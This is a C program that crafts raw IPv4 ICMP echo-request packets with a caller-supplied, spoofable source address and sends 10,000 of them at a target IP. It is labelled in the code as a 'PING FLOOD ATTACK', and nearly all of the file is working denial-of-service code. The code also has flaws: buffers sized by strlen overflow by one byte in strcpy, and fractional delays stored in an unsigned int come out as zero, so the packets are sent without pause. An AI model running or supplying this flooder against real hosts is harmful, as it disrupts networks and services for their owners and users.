#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

struct ipheader {
  unsigned char      iph_ihl:4, //IP header length
                     iph_ver:4; //IP version
  unsigned char      iph_tos; //Type of service
  unsigned short int iph_len; //IP Packet length (data + header)
  unsigned short int iph_ident; //Identification
  unsigned short int iph_flag:3, //Fragmentation flags
                     iph_offset:13; //Flags offset
  unsigned char      iph_ttl; //Time to Live
  unsigned char      iph_protocol; //Protocol type
  unsigned short int iph_chksum; //IP datagram checksum
  struct  in_addr    iph_sourceip; //Source IP address
  struct  in_addr    iph_destip;   //Destination IP address
};

struct icmpheader {
  unsigned char icmp_type; // ICMP message type
  unsigned char icmp_code; // Error code
  unsigned short int icmp_chksum; //Checksum for ICMP Header and data
  unsigned short int icmp_id;     //Used for identifying request
  unsigned short int icmp_seq;    //Sequence number
};

unsigned short in_cksum (unsigned short *buf, int length)
{
   unsigned short *w = buf;
   int nleft = length;
   int sum = 0;
   unsigned short temp=0;

   while (nleft > 1)
   {
       sum += *w++;
       nleft -= 2;
   }

   if (nleft == 1)
   {
        *(u_char *)(&temp) = *(u_char *)w ;
        sum += temp;
   }
   sum = (sum >> 16) + (sum & 0xffff);  // add hi 16 to low 16
   sum += (sum >> 16);                  // add carry
   return (unsigned short)(~sum);
}

int main(int argc, char *argv[]) 
{
   char arr[2000];

   if(argc < 3)
   {
   	printf("Please enter attacker ip and target ip\n");
    return -1;
   }

   printf("Attacker IP: %s\n", argv[1]);
   printf("Target IP: %s\n", argv[2]);

   char attackerIp[strlen(argv[1])], targetIp[strlen(argv[2])];
   strcpy(attackerIp,argv[1]);
   strcpy(targetIp,argv[2]);

   memset(arr, 0, 2000);
   strcpy(arr + sizeof(struct icmpheader) + sizeof(struct ipheader),"PING FLOOD ATTACK");

   unsigned int delay = 0.5;
   
   struct ipheader * iphead = (struct ipheader *) arr;
   iphead -> iph_ver = 4;
   iphead -> iph_ihl = 5;
   iphead -> iph_ttl = 200;
   iphead -> iph_sourceip.s_addr = inet_addr(attackerIp);
   iphead -> iph_destip.s_addr = inet_addr(targetIp);
   iphead -> iph_protocol = IPPROTO_ICMP;
   iphead -> iph_len = htons(sizeof(struct ipheader) + sizeof(struct icmpheader)+strlen("PING FLOOD ATTACK"));
   
   struct icmpheader * icmphead = (struct icmpheader *) (arr + sizeof(struct ipheader));
   icmphead -> icmp_type = 8; //ICMP TYPE 8 == REQUEST, ICMP TYPE 0 == REPLY
   icmphead -> icmp_chksum = 0;
   icmphead -> icmp_chksum = in_cksum((unsigned short *)icmphead, sizeof(struct icmpheader) + strlen("PING FLOOD ATTACK"));

   printf("checksum = %d\n",ntohs(icmphead -> icmp_chksum));
   
   for(int i = 0; i < 10000; i++)
   {
	   	struct sockaddr_in dest_info;
	    int enable = 1;

	    printf("Packet Number: %d\n", i);
		printf("-------Start Sending Packet------\n");
	    
	    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	    int setopt = setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));
	    dest_info.sin_family = AF_INET;
	    dest_info.sin_addr = iphead -> iph_destip;
	    int sendopt =  sendto(sock, iphead, ntohs(iphead -> iph_len), 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
	    
	    if(sock < 0 || setopt < 0 || sendopt < 0)
	    {
	    	printf("Couldn't configure socket\n");
		    printf("%d::%d::%d\n", AF_INET, SOCK_RAW, IPPROTO_RAW);
		    break;
		}
	    
	    close(sock);
	    
	    printf("-------Packet Sent------\n");
	    while(delay)
	    {
	    	delay = sleep(delay);
	    }
	    
	    delay = 0.2;

	}
   return 0;
}
